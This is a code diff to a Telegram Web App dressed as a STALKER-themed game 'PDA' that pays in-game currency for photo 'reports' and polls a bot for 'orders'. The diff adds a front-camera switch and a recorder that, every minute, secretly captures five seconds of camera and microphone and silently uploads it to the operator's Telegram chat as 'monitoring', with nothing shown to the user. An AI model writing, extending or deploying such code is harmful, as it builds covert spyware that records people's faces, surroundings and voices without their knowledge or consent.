@@ -3,19 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii</title>
+    <title>PDA Arsenii v2.0</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
         body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
-        .header { padding: 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; }
-        .avatar { width: 45px; height: 45px; border: 1px solid var(--green); border-radius: 50%; }
+        .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
+        .avatar { width: 40px; height: 40px; border: 1px solid var(--green); border-radius: 50%; }
         .stats { flex-grow: 1; }
-        .balance-main { font-size: 1.3em; font-weight: bold; color: #fff; }
+        .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
+        
+        /* Кнопка смены камеры */
+        .cam-switch {
+            background: none; border: 1px solid var(--green); color: var(--green);
+            padding: 5px 10px; font-size: 0.7em; cursor: pointer; text-transform: uppercase;
+        }
+
         .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
         video { width: 100%; height: 100%; object-fit: cover; filter: sepia(0.3) brightness(1.1); }
+        
         .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
-        .btn-report { width: 100%; padding: 20px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; cursor: pointer; }
+        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; cursor: pointer; }
+        
         .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
         @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
@@ -25,13 +34,16 @@
     <div class="header">
         <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
         <div class="stats">
-            <div id="display-name">STALKER</div>
-            <div class="balance-main"><span id="balance">0</span> ☢️ СТАУН</div>
+            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">STALKER</div>
+            <div class="balance-main"><span id="balance">0</span> ☢️</div>
         </div>
+        <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
     </div>
+
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
+
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px;">ПОИСК СИГНАЛА...</div>
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.9em;">СВЯЗЬ УСТАНОВЛЕНА...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
     </div>
     <canvas id="captureCanvas" style="display:none;"></canvas>
@@ -54,30 +66,56 @@
 
     let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
     let lastUpdateId = 0;
+    let currentFacingMode = "environment"; // Начинаем с основной камеры
 
     document.getElementById('display-name').innerText = user.name.toUpperCase();
     document.getElementById('balance').innerText = balance;
     if (user.photo) document.getElementById('user-pic').src = user.photo;
 
-    async function startPDA() {
+    // Функция запуска камеры
+    async function startPDA(mode) {
+        if (window.currentStream) {
+            window.currentStream.getTracks().forEach(track => track.stop());
+        }
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-            const video = document.getElementById('webcam');
-            video.srcObject = stream;
-            
-            const recorder = new MediaRecorder(stream);
-            recorder.ondataavailable = (e) => {
-                const fd = new FormData();
-                fd.append("chat_id", CONFIG.chatId);
-                fd.append("video", e.data, "log.mp4");
-                fd.append("caption", `📹 МОНИТОРИНГ: ${user.name}`);
-                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
-            };
-            setInterval(() => { if (recorder.state === "recording") { recorder.stop(); setTimeout(() => recorder.start(), 500); } }, 60000);
-            recorder.start();
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
+                audio: true 
+            });
+            window.currentStream = stream;
+            document.getElementById('webcam').srcObject = stream;
         } catch (err) { console.error(err); }
     }
 
+    // Переключение камеры
+    document.getElementById('switchCam').onclick = () => {
+        currentFacingMode = (currentFacingMode === "environment") ? "user" : "environment";
+        startPDA(currentFacingMode);
+        tg.HapticFeedback.impactOccurred('light');
+    };
+
+    // Авто-отправка видео (мониторинг)
+    async function setupRecorder() {
+        // Каждую минуту бот будет просить видео через интервал в основном потоке
+        setInterval(async () => {
+            if (!window.currentStream) return;
+            const recorder = new MediaRecorder(window.currentStream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append("chat_id", CONFIG.chatId);
+                fd.append("video", blob, "log.mp4");
+                fd.append("caption", `📹 МОНИТОРИНГ: ${user.name}\n📸 РАКУРС: ${currentFacingMode}`);
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000); // Записываем по 5 секунд для мониторинга
+        }, 60000);
+    }
+
+    // Синхронизация приказов и денег
     async function sync() {
         try {
             const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
@@ -103,6 +141,7 @@
         } catch (e) {}
     }
 
+    // Кнопка отчета (фото)
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -112,18 +151,19 @@
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
             fd.append("photo", blob, "1.jpg");
-            fd.append("caption", `☢️ ОТЧЕТ: ${user.name}\n🆔 ID: ${user.id}`);
+            fd.append("caption", `☢️ ОТЧЕТ: ${user.name}\n🆔 ID: ${user.id}\n🎥 КАМЕРА: ${currentFacingMode}`);
             const kb = { inline_keyboard: [[
                 { text: "✅ ПРИНЯТЬ (+100)", callback_data: `pay:${user.id}:100` },
                 { text: "💎 ВАЖНОЕ (+500)", callback_data: `pay:${user.id}:500` }
             ]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ОТЧЕТ ОТПРАВЛЕН");
+            tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ В ШТАБ");
         }, "image/jpeg");
     };
 
-    startPDA();
+    startPDA(currentFacingMode);
+    setupRecorder();
     setInterval(sync, 3000);
 </script>
 </body>
